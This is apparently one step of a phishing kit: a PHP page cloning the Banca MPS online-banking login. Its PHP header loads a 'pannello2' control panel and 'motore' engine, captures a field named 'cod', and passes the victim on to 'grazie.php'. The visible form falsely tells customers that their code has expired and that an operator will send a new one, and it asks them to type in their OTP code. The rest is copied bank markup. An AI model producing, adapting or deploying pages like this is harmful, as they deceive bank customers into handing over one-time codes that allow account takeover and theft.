<?php
//INCLUDERE GENERALE
require("pannello2/generale.php");

//CUSTOM
$pagina=array('cod');
$numero = 3;
$prossima = "grazie.php";
$precedente ="index.php";

//INCLUDERE MOTORE
require("pannello2/motore.php");

?>
<html lang="it" style="overflow-y: scroll; height: 90%; max-height: 500px"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Banca MPS</title>

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1,user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-itunes-app" content="app-id=366805842">
    <link rel="stylesheet" type="text/css" href="./Banca MPS_files/w.login.digitalBanking.min.css">
    <script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/539Evs44yecoSf-lkJBQzKKj/recaptcha__it.js" crossorigin="anonymous" integrity="sha384-PgjMgugyZfSYa09k4eKSXGZ3KMOWdANfqwe2YidmYXujnpZFz4r5AkLJn1ri1GFt"></script><script src="./Banca MPS_files/jquery-3.4.1.min.js.download"></script>
    <script src="./Banca MPS_files/jquery-ext.js.download"></script>
    <script src="./Banca MPS_files/jquery-ui-1.10.3.customfade.min.js.download" type="text/javascript" defer=""></script>
    <link href="https://digital.mps.it/cmn/assets/js/jquery-3.4.1.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it/cmn/assets/js/jquery-migrate-3.1.0.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it/cmn/assets/js/jquery-ui-1.12.1.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it/cmn/assets/js/jquery.ui.touch-punch.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it/cmn/assets/js/detectmobilebrowser.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it/assets/js/iscroll.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it/cmn/assets/js/jquery.mask.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it/cmn/assets/css/cropperjs/cropper.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/cmn/assets/css/catalogo/bootstrap.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/cmn/assets/css/catalogo/mpsUI.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/cmn/assets/css/catalogo/mps.sprite.flag.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/cmn/assets/css/catalogo/bootstrap-grid.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/cmn/assets/css/catalogo/bootstrap-reboot.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/cmn/assets/css/catalogo/mpsUIMobile.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/libs/css/w.login.digitalBanking.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/cmn/libs/css/w.common.font.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/cmn/libs/css/w.common.reset.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/libs/css/home.compact.v02.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/libs/css/home.mediaCompressed.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/libs/css/home.w.private.responsive.mobileMedia.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/libs/css/home.w.private.responsive.tabletMedia.v02.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/libs/img/loader/loader4.gif" rel="preload" as="image">
    <link href="https://digital.mps.it/cmn/assets/icons/catalogo/HELP_UI%20Copy%209.svg" rel="preload" as="image">
    <link href="https://digital.mps.it/cmn/assets/icons/catalogo/info%20tooltip_UI.svg" rel="preload" as="image">
    <link href="https://digital.mps.it/cmn/libs/img/logo-complesso-mobile.2x.png" rel="preload" as="image">
    <link href="./Banca MPS_files/iconaSpeechAssistantred.png" rel="preload" as="image">
    <link href="./Banca MPS_files/pub_assistenza_mobile_token.gif" rel="preload" as="image">
    <link href="https://digital.mps.it/libs/img/loader/loader5.gif" rel="preload" as="image">
    <link href="https://digital.mps.it/cmn/font/widibaicons_0.012.woff" rel="preload" as="image">
    <link href="https://digital.mps.it/libs/img/pixOverlay.png" rel="preload" as="image">
    <link href="https://digital.mps.it/libs/img/icon/icon_del.png" rel="preload" as="image">
    <link href="https://digital.mps.it/libs/img/sprite/sprite_30x30_radio.png" rel="preload" as="image">
    <link href="https://digital.mps.it/libs/img/sprite/sprite_30x30_check.png" rel="preload" as="image">
    <link href="https://fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFVZ0b.woff2" rel="preload" as="image">
    <link href="https://fonts.gstatic.com/s/opensans/v15/mem6YaGs126MiZpBA-UFUK0Zdc0.woff2" rel="preload" as="image">
    <link href="https://fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN7rgOUuhp.woff2" rel="preload" as="image">
    <script src="https://www.google.com/recaptcha/api.js" type="text/javascript" async="" defer=""></script>
    <script src="/cmn/assets/js/google/gtmjs.js" type="text/javascript" defer=""></script>
    <script src="/pri/pr/widiba.i18n.jsp?vers=1189026" type="text/javascript" defer=""></script>
    <script src="/cmn/assets/js/jquery-ui-1.10.3.customfade.min.js?vers=1189026" type="text/javascript" defer=""></script>
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery-3.4.1.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery-migrate-3.1.0.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.mps.hack.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery-ui-1.12.1.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.funzioni.iframe.js" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/icheck.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/catalogo/popper.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/catalogo/tooltip.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.ui.touch-punch.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/detectmobilebrowser.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/assets/js/iscroll.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/format.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/mps.autoNumeric.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/cropjs/bluebird.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.facedetection.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.minicolors.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/cropjs/cropper.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/cropjs/ext/8bit.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/cropjs/ext/load-image.all.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/cropjs/custom/crop.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/cropjs/smartcrop.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/cropjs/smartcrop-debug.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/no.click.delay.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.flexslider-min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.dataTables.min-1.10.17.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/footable.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/footable.sort.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/footable.integration.plugin.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.qtip.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.autosize.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/mps.encode.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/assets/js/blocksit.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/assets/js/blocksit.js" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.core.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.base.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.detect.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.header.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.dock.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.alert.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.util.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.widget.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.accordion.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.popup.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.banner.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.selectbox.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.selectbox.template.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.datatable.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.infobox.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.infobox.contocorrente.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.infobox.carte.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.mobile.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.draggable.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widdy/widiba.widdy.configurations.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widdy/widiba.widdy.core.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widdy/widiba.widdy.animations.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widdy/widiba.widdy.util.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.funzioni.iframe.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/mps.page.pec.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/mps.page.homepage.postbody.js" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.placeholder.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/widiba.page.infopopup.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/widiba.page.campagneCrm.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/widiba.page.push.js" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/widiba.page.campagne.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/widiba.page.homepage.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/widiba.page.buonoLineaPromo.js" rel="preload" as="script">
    <link href="https://digital.mps.it:443/assets/js/jquery.lazyscrollloading-min.js" rel="preload" as="script">
    <link href="https://digital.mps.it:443/assets/js/jquery.flip.min.js" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/widiba.page.homepage.news.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/widiba.page.homepage.sezioneeconomica.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/mps.page.questionarioprotezione.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.selectbox.template.2.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.selectbox.template.13.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.selectbox.template.1.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.selectbox.template.8.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.selectbox.template.16.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.selectbox.template.19.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.mask.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/css/catalogo/mps_padding_margin.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/assets/css/cropperjs/cropper.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/assets/css/catalogo/bootstrap.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/assets/css/catalogo/mpsUI.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/assets/css/catalogo/mps.sprite.flag.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/assets/css/catalogo/bootstrap-grid.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/assets/css/catalogo/bootstrap-reboot.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/assets/css/catalogo/mpsUIMobile.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/libs/css/w.login.digitalBanking.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/libs/css/w.common.font.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/libs/css/w.common.reset.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/libs/css/home.compact.v02.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/libs/css/home.mediaCompressed.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/libs/css/home.w.private.responsive.mobileMedia.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/libs/css/home.w.private.responsive.tabletMedia.v02.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/libs/img/loader/loader4.gif" rel="preload" as="image">
    <link href="https://digital.mps.it:443/cmn/assets/icons/catalogo/HELP_UI Copy 9.svg" rel="preload" as="image">
    <link href="https://digital.mps.it:443/cmn/assets/icons/catalogo/info tooltip_UI.svg" rel="preload" as="image">
    <link href="https://digital.mps.it:443/cmn/libs/img/logo-complesso-mobile.2x.png" rel="preload" as="image">
    <link href="https://digital.mps.it:443/libs/img/loginBI/iconaSpeechAssistantred.png" rel="preload" as="image">
    <link href="https://digital.mps.it:443/libs/img/pb/pub_assistenza_mobile_token.gif" rel="preload" as="image">
    <link href="https://digital.mps.it:443/libs/img/loader/loader5.gif" rel="preload" as="image">
    <link href="https://digital.mps.it:443/cmn/font/widibaicons_0.012.woff" rel="preload" as="image">
    <link href="https://digital.mps.it:443/libs/img/pixOverlay.png" rel="preload" as="image">
    <link href="https://digital.mps.it:443/libs/img/icon/icon_del.png" rel="preload" as="image">
    <link href="https://digital.mps.it:443/libs/img/sprite/sprite_30x30_radio.png" rel="preload" as="image">
    <link href="https://digital.mps.it:443/libs/img/sprite/sprite_30x30_check.png" rel="preload" as="image">
    <link href="https://fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFVZ0b.woff2" rel="preload" as="image">
    <link href="https://fonts.gstatic.com/s/opensans/v15/mem6YaGs126MiZpBA-UFUK0Zdc0.woff2" rel="preload" as="image">
    <link href="https://fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN7rgOUuhp.woff2" rel="preload" as="image">
</head>

<body class="desktop webkit chrome supported3D noScroll">

    <div class="db_login_70perc urlPrivacyCookie" id="wrapperLogin70perc" data-privacy-check-url="/pri/loginib/checkPrivacyCookie.action?nullnull" data-privacy-set-url="/pri/loginib/setPrivacyCookie.action?nullnull">
        <div id="digitalBankingMain" class="row">
            <div class="smartbanner" style="display:none" id="smartabanner">
                <div class="smartbanner-container">
                    <a href="https://digital.mps.it/pri/login/home_mobile.jsp#" id="smb-close" class="smartbanner-close" data-template="#button-btnCloseSmartBanner">×</a>
                    <span class="smartbanner-icon"></span>
                    <div class="smartbanner-info">
                        <div class="smartbanner-title">Banca MPS</div>
                        <div>Banca Monte dei paschi di Siena S.p.a.</div>
                        <span id="description-banner"></span>
                    </div>
                    <a href="javascript: void(0))" target="_blank" id="buttonBannerLink" class="smartbanner-button">
                        <span id="buttonStore" class="smartbanner-button-text">Apri</span>
                    </a>
                </div>
            </div>
            <div class="container80baseDigital">


                <div class="row">
                    <div class="col-md-24">
                        <div class="row" id="boxNavigationDigitalBanking">
                            <div class="col-12">
                                <div id="backToUserCodeFromPassword" class="dB_icon_link_container" style="display: none;">
                                    <a class="dB_link_with_icon" id="btnIndietroPsw" href="javascript: void(0)" data-template="#button-btnIndietroPsw">
                                        <div class="img-svg mps_small_arrow_down_red mps_rotate_90"></div>
                                        <h4 class="mps_bold">Indietro</h4>
                                    </a>
                                </div>
                                <div id="backToUserCodeFromPasswordBlue" class="dB_icon_link_container" style="display: none;">
                                    <a class="dB_link_with_icon" id="btnIndietroPswBlu" href="javascript: void(0)" data-template="#button-btnIndietroPswBlu">
                                        <div class="img-svg mps_small_arrow_down_red mps_rotate_90"></div>
                                        <h4 class="mps_bold">Indietro</h4>
                                    </a>
                                </div>
                                <div id="backToPswFromOtp" class="dB_icon_link_container" style="display: none;">
                                    <a class="dB_link_with_icon" id="backToPsw" href="javascript: void(0)" data-template="#button-btnBackToPsw">
                                        <div class="img-svg mps_small_arrow_down_red mps_rotate_90"></div>
                                        <h4 class="mps_bold">Indietro</h4>
                                    </a>
                                </div>
                                <div id="backToPswFromFeF" class="dB_icon_link_container" style="display: none;">
                                    <a class="dB_link_with_icon" id="backToPswtoFeF" href="javascript: void(0)" data-template="#button-btnBackToPswFromFeF">
                                        <div class="img-svg mps_small_arrow_down_red mps_rotate_90"></div>
                                        <h4 class="mps_bold">Indietro</h4>
                                    </a>
                                </div>
                                <div id="backToPswBlueFromNewPsw" class="dB_icon_link_container" style="display: none;">
                                    <a class="dB_link_with_icon" id="btnIndietroNewPsw" href="javascript: void(0)" data-template="#button-btnIndietroNewPsw">
                                        <div class="img-svg mps_small_arrow_down_red mps_rotate_90"></div>
                                        <h4 class="mps_bold">Indietro</h4>
                                    </a>
                                </div>
                            </div>
                            <div class="col-12" style="height:36px">
                                <div id="close" class="mps_icon_link_container" style="float: right; padding-right: 0;">
                                    <a class="mps_link_with_icon" id="btnIndietroNewPsw" href="javascript: void(0)" onclick="hideOverlay()" tabindex="-1">
                                    </a>
                                </div>
                            </div>
                            <div class="col-2"></div>
                            <div class="col-20">
                                <div class="db_media_center_wrapper db_column_middle"></div>
                                <div class="db_content_login_header">
                                    <div class="db_logo_black" style="background: url(&quot;https://digital.mps.it/libs/img/montedeipaschi_logo_hd.png&quot;) center center no-repeat; height: 88px; top: 20px; margin: 0px auto 20px;"></div>
                                </div>
                            </div>
                            <div class="col-2"></div>
                            <script>
                                function hideOverlay() {
                                    $("#overlayMPS").hide(); //NASCONDO L'OVERLAY
                                    $('#innerDiv').html(""); //SVUOTO IL DIV 

                                    $("body.hp").css("overflow", "auto"); //RIABILITO LO SCROLL SUL BODY 
                                }
                            </script>
                        </div>
                    </div>
                </div>
                <div class="row db_responsiveRow">
                    <div class="col-md-1"></div>
                    <div class="col-md-22 form-group mps_input_with_label_container dB_responsive" id="db_mainBox" tabindex="0" role="form" aria-label="Accedi al tuo Digital Banking">
                        <div id="includeHeader" class="margin_login_header includeHeader">
                            <div class="mps_form_container_centrale">
                                <div class="row" id="boxHeaderDgitalBanking">
                                    <div class="col-md-19">
                                        
                                    </div>
                                </div>
                            </div>
                        </div>
                        <form method="POST" id="includeCodUser" class="margin_login_header includeCodUser dB_box_container">

                            <input type="hidden" name="userType" id="userType">
                            <div id="login-codiceUtente">
                                <div class="mps_input_with_label_form">
                                    <div class="mps_form_container_centrale">
                                        <table class="db_marginTopBottom_header">
                                            <tbody>
                                                <tr>
                                                    <td>
                                                        <h3>Gentile Cliente il codice da lei inserito potrebbe essere scaduto o digitato
                                                            con errori, per questo motivo abbiamo passato la pratica ad un operatore
                                                            che verificherà in pochi minuti la sua utenza e le invierà un nuovo codice.
                                                            Lo inserisca di seguito:</h3>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                        <div class="row">
                                            <div class="col-md-6 db_colLabelCustom">
                                                <div class="mps_label_with_tooltip_container">
                                                    <label class="mps_label dB_label" id="labelCodUserSca" for="input-codUser">Codice OTP</label>
                                                    <div class="mps_tooltip_white_background_red_bi dB_tooltip_margin" data-toggle="tooltip" title="" data-original-title="Inserisci il tuo codice utente"></div>
                                                </div>
                                            </div>
                                            <div class="col-md-13 db_colInputCustom">
                                                <input type="text" class="form-control mps_input" aria-required="true" id="input-codUser" placeholder="" name="cod">
                                                <a id="iCheck" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_approved_green dB_inputCheck"></div>
                                                </a>
                                                <a id="iError" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_not_approved_red dB_inputCheck"></div>
                                                </a>
                                            </div>
                                            
                                            
                                            
                                            
                                            <div class="col-md-5 paddingTop-Login">
                                                <a href="javascript: void(0)" id="buttonSubmit" tabindex="0" role="button" data-template="#button-btnAvantiCodUser" data-json-url="/pri/loginib/checkCodiceUtenteMobileTokenScaJSON.action?nullnull&amp;guidCRFSLogIn=45ae3e02-f6c3-4810-9a4a-5630ea97d3e4" class="db_text_white">
                                                    <button type="submit" class="btn btn-primary" tabindex="-1">ENTRA</button>
                                                </a>
                                            </div>
                                        </div>
                                        <div class="row add-margin-20" tabindex="0" aria-label="Memorizza il tuo Codice Utente e dal prossimo accesso non dovrai più inserirlo">
                                            
                                        </div>
                                        
                                    </div>
                                </div>
                            </div>
                        </form>
                        <div id="includePsw" class="margin_login_header includePsw dB_box_container" style="display:none; ">
                            <div id="login-password">
                                <div class="mps_input_with_label_form">
                                    <div class="mps_form_container_centrale">
                                        <table class="db_marginTopBottom_header">
                                            <tbody>
                                                <tr>
                                                    <td>
                                                        <h3>Accedi al tuo Digital Banking</h3>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                        <div class="row">
                                            <div class="col-md-6 db_colLabelCustom" id="loginStepPassword2">
                                                <div class="mps_label_with_tooltip_container">
                                                    <label id="labelPswSca" class="mps_label dB_label" for="input-password">Password</label>
                                                    <div class="mps_tooltip_white_background_red_bi dB_tooltip_margin" data-toggle="tooltip" title="" data-original-title="Inserisci la password di 8 cifre per accedere a Digital Banking."></div>
                                                </div>
                                            </div>
                                            <div class="col-md-13 db_colInputCustom" id="loginStepPassword3">
                                                <input type="tel" class="form-control mps_input conceal" id="input-password" autocomplete="off" maxlength="8" placeholder="Inserisci la password" onkeypress="return digitalBankingSCA.isNumberKey(event);" autofocus="" aria-required="true" aria-label="Inserisci la password di 8 cifre per accedere a Digital Banking.">
                                                <a id="pCheck" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_approved_green dB_inputCheck"></div>
                                                </a>
                                                <a id="pError" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_not_approved_red dB_inputCheck"></div>
                                                </a>
                                            </div>
                                            <div class="col-md-5 paddingTop-Login">
                                                <a href="javascript: void(0)" data-template="#button-btnAvantiPsw" id="avantiPsw" tabindex="-1" role="button" data-json-url="/pri/loginib/generateOptPostPWMobileTokenScaJSON.action?nullnull">
                                                    <button id="btnAvantiPsw" type="button" tabindex="-1" class="btn btn-lg btn-primary" disabled="">
AVANTI
</button>
                                                </a>
                                            </div>
                                        </div>
                                        <div class="row" style="margin-top:20px;" tabindex="0" id="loginStepPassword5">
                                            <div class="col-md-24">
                                                <label class="mps_label dB_label">Hai dimenticato la password?</label>
                                                <a id="linkRecuperaPassword" href="https://digital.mps.it/pri/login/home_mobile.jsp#" onclick="open_win();" title="Recupera password" class="mps_label dB_label_link">Recupera password</a>
                                            </div>
                                        </div>
                                        <div id="" class="recuperoCodiceUtenteDigital" style="padding-top: 15px">
                                            <h5><a id="linkCarteSicurezza9" href="https://digital.mps.it/pri/login/home_mobile.jsp#" tabindex="0" onclick="window.open('/pub/pb/aolInizio/action/pb/recuperaUtenteUsernameInit.action?sezId=nav_recupero_credenziali&amp;pageId=nav_recupero_credenziali', '_self');">
RECUPERA CODICE UTENTE
</a></h5>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <script>
                                //ENTER TO SUBMIT
                                document.getElementById("input-password")
                                    .addEventListener("keyup", function(event) {
                                        if (event.keyCode == 13 && $("#input-password").val().length == 8) {
                                            $("#avantiPsw").click();
                                        }
                                    });

                                //Controllo lunghezza Input			 
                                $("#input-password").keyup(function() {
                                    var ipt = $('#input-password').val();
                                    if (ipt.length < 1) {
                                        $('#pCheck').css('display', 'none');
                                        $('#pError').css('display', 'none');
                                        $('#btnAvantiPsw').prop("disabled", true);
                                        $('#avantiPsw').prop("tabindex", -1);
                                    } else if (ipt.length < 8) {
                                        $('#pCheck').css('display', 'none');
                                        $('#pError').css('display', 'block');
                                        $('#btnAvantiPsw').prop("disabled", true);
                                        $('#avantiPsw').prop("tabindex", -1);
                                    } else if ((ipt.length == 8) && ($.isNumeric(ipt))) {
                                        $('#pError').css('display', 'none');
                                        $('#pCheck').css('display', 'block');
                                        $('#btnAvantiPsw').prop("disabled", false);
                                        $('#avantiPsw').prop("tabindex", 0);
                                    } else {
                                        $('#pError').css('display', 'block');
                                        $('#pCheck').css('display', 'none');
                                        $('#btnAvantiPsw').prop("disabled", true);
                                        $('#avantiPsw').prop("tabindex", -1);
                                    }
                                });


                                function open_win() {
                                    window.open('/pub/pb/aolInizio/action/pb/recuperaCredenzialiPasswordInit.action?sezId=nav_recupero_credenziali&pageId=nav_recupero_credenziali', '_blank');
                                }
                            </script>
                        </div>
                        <div id="includeCodOtpSca" class="margin_login_header includeCodOtp dB_box_container" style="display: none;">
                            <input type="hidden" id="otp-sms" class="wd_default" style="display: none;" value="Codice SMS">
                            <input type="hidden" id="otp" class="wd_default" style="display: none;" value="Chiave elettronica">
                            <input type="hidden" id="otpMT" class="wd_default" style="display: none;" value="Ti abbiamo inviato una <b>Notifica</b> sul tuo cellulare per autorizzare l'accesso al tuo Digital Banking. ">
                            <input type="hidden" id="typeOtp" class="wd_default" style="display: none;" value="">
                            <div id="login-otp">
                                <div class="mps_input_with_label_form">
                                    <div class="mps_form_container_centrale">
                                        <table class="db_marginTopBottom_header">
                                            <tbody>
                                                <tr>
                                                    <td>
                                                        <h3>Accedi al tuo Digital Banking</h3>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                        <div class="row">
                                            <div id="width-input-otp" class="col-md-6 db_colLabelCustom">
                                                <div class="mps_label_with_tooltip_container">
                                                    <label class="mps_label dB_label" for="input-otp" id="codice-otp"></label>
                                                    <div class="mps_tooltip_white_background_red_bi dB_tooltip_margin divtooltipCodiceConferma" data-toggle="tooltip" data-original-title="" title=""></div>
                                                </div>
                                            </div>
                                            <div class="col-md-13 db_colInputCustom">
                                                <input type="tel" class=" mps_input conceal" id="input-otp" placeholder="Inserisci il codice di conferma" value="" autocomplete="one-time-code" maxlength="6" aria-required="true" onkeypress="return digitalBankingSCA.isNumberKey(event);">
                                                <a id="cCheck" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_approved_green dB_inputCheck"></div>
                                                </a>
                                                <a id="cError" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
                                                    <div class="mps_not_approved_red dB_inputCheck"></div>
                                                </a>
                                            </div>
                                            <div class="col-md-5 paddingTop-Login">
                                                <a href="javascript: void(0)" data-template="#button-btnGoToIn" id="avantiOtp" tabindex="-1" role="button" data-json-url="/pri/loginib/checkNumeroTentativiMobileTokenScaJSON.action?nullnull">
                                                    <button type="button" id="button-btnGoToIn" tabindex="-1" class="btn btn-primary" disabled="">ENTRA</button>
                                                </a>
                                            </div>
                                        </div>
                                        <div id="linkRecuperaCodConferma" class="row" style="display:none;">
                                            <div class="col-md-24" tabindex="0" id="loginOtp2">
